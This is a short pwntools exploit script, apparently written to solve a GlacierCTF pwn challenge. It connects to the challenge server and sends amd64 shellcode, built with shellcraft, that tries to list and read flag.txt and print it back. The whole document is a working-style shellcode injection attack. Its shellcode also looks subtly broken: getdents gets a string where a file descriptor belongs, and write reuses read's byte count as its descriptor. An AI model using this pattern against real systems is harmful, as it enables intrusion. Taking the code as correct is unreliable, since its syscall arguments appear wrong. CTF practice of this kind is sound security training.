from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
context.update(arch='amd64')
elf = ELF('./vuln')
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


from pwn import *

p = remote('chall.glacierctf.com', 13383)
#p = process('./vuln')
#p = gdb.debug('./vuln', '''
#b *main
#b *main+220''')

AT_FDCWD = -100


sc = shellcraft.linux.getdents(AT_FDCWD, 'flag.txt', 0)
sc += shellcraft.linux.read('rax', 'rsp', 32)
sc += shellcraft.linux.write('rax', 'rsp', 32)
sc += shellcraft.linux.exit(0)

info(sc)

p.recvuntil('Shellcode:')
p.sendline(asm(sc))
p.interactive()
